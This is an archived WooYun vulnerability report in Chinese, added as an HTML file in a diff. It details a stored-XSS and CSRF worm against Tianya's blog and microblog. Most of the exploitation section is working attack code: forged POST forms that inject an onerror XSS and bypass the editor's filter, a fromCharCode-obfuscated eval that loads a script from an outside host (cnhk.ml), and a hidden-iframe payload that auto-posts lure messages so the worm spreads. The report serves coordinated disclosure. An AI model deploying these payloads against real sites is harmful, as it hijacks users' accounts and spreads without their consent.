@@ -1,0 +1,325 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		天涯CSRF系列四: 利用储存XSS+伪CSRF进行蠕虫攻击(XSS过滤器绕过)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		天涯CSRF系列四: 利用储存XSS+伪CSRF进行蠕虫攻击(XSS过滤器绕过)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/LaiX">LaiX</a> 
+</li><li>提交时间：		2013-08-28 07:49</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-28：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-28：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-07：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-09-17：	细节向普通白帽子公开<br/>
+									2013-09-27：	细节向实习白帽子公开<br/>
+									2013-10-12：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">这次的例子将结合一个POST的CSRF来实现蠕虫攻击，这次的蠕虫仅仅是利用一个CSRF来传播，如果用XSS(dom操作)来感染，危害更大。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">通过发微博，我抓到了一个这样一个POST的地址<br />
+<br />
+</p><pre><code>http://www.tianya.cn/api/tw?method=tweet.ice.insert</code></pre><p class='detail'><br />
+<br />
+当我们单独访问这个地址的时候，出现如下信息。<br />
+<br />
+</p><p class="detail"><a href="../images/271722206af364c19c4e14abeb3f8cc649420dd3.png" target="_blank"><img src="../images/271722206af364c19c4e14abeb3f8cc649420dd3.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+这说明什么？说明已经对来源的地址做了过滤。<br />
+<br />
+有的同学就问了，这还CSRF什么?还利用个毛啊!<br />
+<br />
+不要急嘛，故事才刚刚开始。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">既然我们无法通过外部的链接来触发CSRF，那么我们可以利用储存型的XSS来触发这个CSRF。在本域下发包，来源域是天涯的，自然不会拦截。<br />
+<br />
+正好在天涯博客日志页面发现一个储存XSS的实例，那我们就来结合这个实例进行一次蠕虫攻击。<br />
+<br />
+1.一波三折的XSS过滤器绕过<br />
+<br />
+首先打开HTML编辑器<br />
+<br />
+</p><p class="detail"><a href="../images/271736249b1ba2af2eca72582b62fc352e8a0f57.png" target="_blank"><img src="../images/271736249b1ba2af2eca72582b62fc352e8a0f57.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+先插入一条</p><pre><code>&lt;img src=x&gt;</code></pre><p class='detail'>试试<br />
+<br />
+点击更新在点HTML编辑回来发现变成了这样<br />
+<br />
+</p><p class="detail"><a href="../images/27173924f14673e49de6c79d3abce9cda675f54c.png" target="_blank"><img src="../images/27173924f14673e49de6c79d3abce9cda675f54c.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+没关系,我们打开开发者工具在源码中修改<br />
+<br />
+</p><p class="detail"><a href="../images/271741303d29687058cf0e72cffe9252dec272af.png" target="_blank"><img src="../images/271741303d29687058cf0e72cffe9252dec272af.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+发布之后，打开开发者工具发现又被替换成了这样<br />
+<br />
+</p><p class="detail"><a href="../images/27174258cd5737aa2c08357314c8eee22bd0acbb.png" target="_blank"><img src="../images/27174258cd5737aa2c08357314c8eee22bd0acbb.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+万一只是SRC被替换呢，试试插入onerror事件<br />
+<br />
+</p><p class="detail"><a href="../images/2717451161bdf51b13f2a9eede2b260f4a5522d9.png" target="_blank"><img src="../images/2717451161bdf51b13f2a9eede2b260f4a5522d9.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+发布之后，发现又被吃掉了。<br />
+<br />
+这也不行那也不行，干脆直接发包来提交文章吧。<br />
+<br />
+看了下参数，我构造了一个POST的HTML来发文章<br />
+<br />
+</p><pre><code>&lt;form action=&quot;http://blog.tianya.cn/qing/tyqing_post_submit.asp&quot; method=&quot;post&quot; &gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;blogId&quot; value=&quot;4784133&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;test&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;&lt;img src=x onerror=alert() &gt;&quot; &gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;keyWord&quot; value=&quot;&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;categoryId&quot; value=&quot;0&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;setTop&quot; value=&quot;0&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;ChannelCate&quot; value=&quot;0&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;size&quot; value=&quot;500&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;bHidden&quot; value=&quot;0&quot;&gt;<br />
+        &lt;input type=&quot;submit&quot; value=&quot;ok&quot;&gt;<br />
+&lt;/form</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/27174919c9de3cc9be4c86192bb8532676a6fea7.png" target="_blank"><img src="../images/27174919c9de3cc9be4c86192bb8532676a6fea7.png" alt="7.png" width="600"/></a></p><p class="detail"><br />
+<br />
+提交之后：<br />
+<br />
+</p><p class="detail"><a href="../images/27175043db6c1dec8bb2d1fadbcd7ed5ddfb4612.png" target="_blank"><img src="../images/27175043db6c1dec8bb2d1fadbcd7ed5ddfb4612.png" alt="8.png" width="600"/></a></p><p class="detail"><br />
+<br />
+回到博客主页，终于弹起来了<br />
+<br />
+</p><p class="detail"><a href="../images/27175505875b44f52cb53ff6fbdce9ae66261ce6.png" target="_blank"><img src="../images/27175505875b44f52cb53ff6fbdce9ae66261ce6.png" alt="9.png" width="600"/></a></p><p class="detail"><br />
+<br />
+弹起来了就意味着可以蠕虫了。<br />
+<br />
+<br />
+<br />
+接下来我们来整理一下逻辑。首先我们需要编写一个访问我的博客地址就能自动发微博的一段payload。通过这个payload可以发布我的博客地址然后诱导大家都来访问，这样下去访问一次就自动发一次微博，达到蠕虫传播的效果。<br />
+<br />
+<br />
+<br />
+2.构造payload<br />
+<br />
+<br />
+<br />
+构造这个payload，我们得弄清楚先做什么再做什么。<br />
+<br />
+第一步：构造一个发布微博的HTML表单<br />
+<br />
+第二步：构造一个iframe来进行POST提交,或者使用AJAX提交(因为是同域的情况下，这里我使用iframe,便于学习跨域提交)<br />
+<br />
+第三步：把发布微博的HTML表单写进iframe里然后隐蔽的提交<br />
+<br />
+<br />
+<br />
+经过这三步，我们得到一个完整的 payload:<br />
+<br />
+</p><pre><code>/* 首先动态创建一个iframe */<br />
+var div = document.getElementById(&quot;blog_nav&quot;);<br />
+var iframe = document.createElement(&quot;iframe&quot;);<br />
+iframe.src = &#039;&#039;;<br />
+iframe.style.display = &quot;none&quot;;<br />
+iframe.id = &quot;test_iframe&quot;<br />
+div.appendChild(iframe);<br />
+/* 接着向iframe中写入提交微博的代码 */<br />
+var SendConent =&quot;推荐大家一个好玩的 http://blog.tianya.cn/blogger/blog_main.asp?BlogID=4784133&quot;;<br />
+test_iframe.document.write<br />
+(<br />
+	&quot;&lt;form id=&#039;test_form&#039; action=&#039;http://www.tianya.cn/api/tw?method=tweet.ice.insert&#039; method=&#039;post&#039; &gt;&quot;<br />
+    +&quot;&lt;input type=&#039;hidden&#039; name=&#039;params.appId&#039; value=&#039;twitter&#039;&gt;&quot;<br />
+    +&quot;&lt;input type=&#039;hidden&#039; name=&#039;params.title&#039; value=&#039;&quot;+ SendConent +&quot;&#039;&gt;&quot;<br />
+    +&quot;&lt;input type=&#039;hidden&#039; name=&#039;params.sourceName&#039; value=&#039;天涯微博&#039;&gt;&quot;<br />
+    +&quot;&lt;/form&gt;&quot;<br />
+    +&quot;&lt;script&gt;document.getElementById(&#039;test_form&#039;).submit();&lt;\/script&gt;&quot;<br />
+);</code></pre><p class='detail'><br />
+<br />
+现在payload有了，怎么才能让payload执行呢。<br />
+<br />
+我们得先往博客上发恶意代码才行。为了发送恶意代码我构造了这样一个POST表单<br />
+<br />
+</p><pre><code>&lt;form action=&quot;http://blog.tianya.cn/qing/tyqing_post_submit.asp&quot; method=&quot;post&quot; &gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;blogId&quot; value=&quot;4784133&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;test&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;&lt;img src=&#039;bcdcmd.txt&#039; onerror=&#039;eval(String.fromCharCode(118,97,114,32,111,72,101,97,100,61,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,72,69,65,68,39,41,46,105,116,101,109,40,48,41,59,118,97,114,32,111,83,99,114,105,112,116,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,111,83,99,114,105,112,116,46,116,121,112,101,61,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,111,83,99,114,105,112,116,46,115,114,99,61,39,104,116,116,112,58,47,47,99,110,104,107,46,109,108,47,116,105,97,110,121,97,47,116,105,97,110,121,97,46,106,115,39,59,111,72,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,111,83,99,114,105,112,116,41))&#039;&gt;&quot; &gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;keyWord&quot; value=&quot;&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;categoryId&quot; value=&quot;0&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;setTop&quot; value=&quot;0&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;ChannelCate&quot; value=&quot;0&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;size&quot; value=&quot;500&quot;&gt;<br />
+        &lt;input type=&quot;hidden&quot; name=&quot;bHidden&quot; value=&quot;0&quot;&gt;<br />
+        &lt;input type=&quot;submit&quot; value=&quot;ok&quot;&gt;<br />
+&lt;/form&gt;</code></pre><p class='detail'><br />
+<br />
+其中一大串ASCII码代表：<br />
+<br />
+</p><pre><code>var oHead = document.getElementsByTagName(&#039;HEAD&#039;).item(0);<br />
+var oScript = document.createElement(&#039;script&#039;);<br />
+oScript.type = &#039;text/javascript&#039;;<br />
+oScript.src = &#039;http://cnhk.ml/tianya/tianya.js&#039;;<br />
+oHead.appendChild(oScript);</code></pre><p class='detail'><br />
+<br />
+其意为 引入一个外部的JS文件，也就是引入我们的payload, 当访问者访问我们的博客就会触发payload立刻感染。<br />
+<br />
+<br />
+<br />
+接着用它发表一篇带有恶意代码的文章，到目前位置所有的工作都做完了。<br />
+<br />
+</p><p class="detail"><a href="../images/27190246fc8fb25f4788a79b87fa975a8758a26c.png" target="_blank"><img src="../images/27190246fc8fb25f4788a79b87fa975a8758a26c.png" alt="10.png" width="600"/></a></p><p class="detail"><br />
+<br />
+刷新之后我们看看微博：<br />
+<br />
+</p><p class="detail"><a href="../images/2719032896b9949d50fc501863d5a82abf3b4d61.png" target="_blank"><img src="../images/2719032896b9949d50fc501863d5a82abf3b4d61.png" alt="11.png" width="600"/></a></p><p class="detail"><br />
+<br />
+当别的用户看见我们发的微博，带着强烈的好奇心就会来点击链接，然后...<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">累死我了，@XSSER 这下给高点rank不过分了吧.......- -; </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/LaiX" title="LaiX">LaiX</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-035424" title="天涯CSRF系列四: 利用储存XSS+伪CSRF进行蠕虫攻击(XSS过滤器绕过)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：4 </p>
+													<p class="detail">确认时间：2013-08-28 15:20</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提供，辛苦了。 ：）</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="35424";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
